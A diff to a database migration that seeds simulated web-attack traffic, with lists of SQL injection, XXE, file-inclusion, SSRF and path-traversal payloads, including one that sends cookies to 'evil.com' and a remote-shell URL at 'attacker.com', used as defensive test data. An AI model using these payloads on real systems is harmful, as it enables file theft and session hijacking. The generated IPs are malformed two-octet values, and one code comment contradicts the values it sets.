@@ -1,6 +1,6 @@
 """Add attack simulation seed data
 Revision ID: 296c754dec69
-Revises: bc03b9831e8c
+Revises: adcb321513ca
 Create Date: 2024-11-23 17:30:50.338468
 """
 
@@ -14,7 +14,7 @@ from zoneinfo import ZoneInfo
 
 # revision identifiers, used by Alembic.
 revision: str = "296c754dec69"
-down_revision: Union[str, None] = "bc03b9831e8c"
+down_revision: Union[str, None] = "adcb321513ca"
 branch_labels: Union[str, Sequence[str], None] = None
 depends_on: Union[str, Sequence[str], None] = None
 
@@ -24,11 +24,6 @@ class AttackPatterns:
         "' OR '1'='1",
         "UNION SELECT * FROM users",
         "1'; DROP TABLE users--",
-        "admin'--",
-        "' OR '1'='1' /*",
-        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
-        "1 OR 1=1",
-        "1' AND 1=(SELECT COUNT(*) FROM tabname); --",
     ]
 
     XSS = [
@@ -56,8 +51,31 @@ class AttackPatterns:
     PATH_TRAVERSAL = [
         "../../../etc/passwd",
         "..\\..\\..\\windows\\win.ini",
-        "%2e%2e%2f%2e%2e%2f",
-        "....//....//etc/passwd",
+    ]
+    
+    CSRF = [
+        "<img src='http://evil.com/steal?cookie=' + document.cookie>",
+        "<form action='http://evil.com'>",
+    ]
+
+    LFI = [
+        "../../../../../../etc/passwd",
+        "php://filter/convert.base64-encode/resource=index.php",
+    ]
+
+    RFI = [
+        "http://evil.com/malicious.php",
+        "https://attacker.com/shell.php",
+    ]
+
+    XXE_INJECTION = [
+        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>',
+        '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]>',
+    ]
+
+    SSRF = [
+        "http://localhost:8080/admin",
+        "file:///etc/passwd",
     ]
 
 
@@ -111,6 +129,11 @@ def create_sample_messages(domain: str, num_messages: int = 1000) -> list:
         "nosql_injection": AttackPatterns.NOSQL_INJECTION,
         "command_injection": AttackPatterns.COMMAND_INJECTION,
         "path_traversal": AttackPatterns.PATH_TRAVERSAL,
+        "csrf": AttackPatterns.CSRF,
+        "local_file_inclusion": AttackPatterns.LFI,
+        "remote_file_inclusion": AttackPatterns.RFI,
+        "xxe_injection": AttackPatterns.XXE_INJECTION,
+        "ssrf": AttackPatterns.SSRF,
     }
 
     # Generate messages with timestamps spanning the last 24 hours
@@ -128,26 +151,35 @@ def create_sample_messages(domain: str, num_messages: int = 1000) -> list:
             is_malicious = True
             # 80% chance of blocking malicious traffic
             caused_block = random.random() < 0.8
+            # Higher confidence for malicious traffic
+            confidence_score = random.uniform(0.7, 0.99) if caused_block else random.uniform(0.5, 0.7)
         else:
             # Generate legitimate form input
             message_text, input_type = generate_legitimate_input()
             is_malicious = False
             caused_block = False
+            # Lower confidence for legitimate traffic
+            confidence_score = random.uniform(0.8, 1)
 
         # Generate random timestamp within the last 24 hours
         random_seconds = random.randint(0, int((end_time - start_time).total_seconds()))
         timestamp = start_time + timedelta(seconds=random_seconds)
 
+        # Generate more varied IP addresses
+        ip_first_octet = random.choice([10, 172, 192])
+        ip_address = f"{ip_first_octet}.{random.randint(1, 254)}"
+
         messages.append(
             {
                 "domain": domain,
-                "ip_address": f"192.168.1.{random.randint(1, 254)}",
+                "ip_address": ip_address,
                 "message": message_text,
                 "type": "form_input",
                 "is_malicious": is_malicious,
                 "caused_block": caused_block,
                 "created_at": timestamp,
                 "blocked_at": timestamp if caused_block else None,
+                "confidence_score": confidence_score,
             }
         )
 
@@ -182,6 +214,7 @@ def upgrade():
         column("caused_block", sa.Boolean),
         column("created_at", sa.DateTime),
         column("blocked_at", sa.DateTime),
+        column("confidence_score", sa.Float),
     )
 
     # Generate and insert attack simulation data
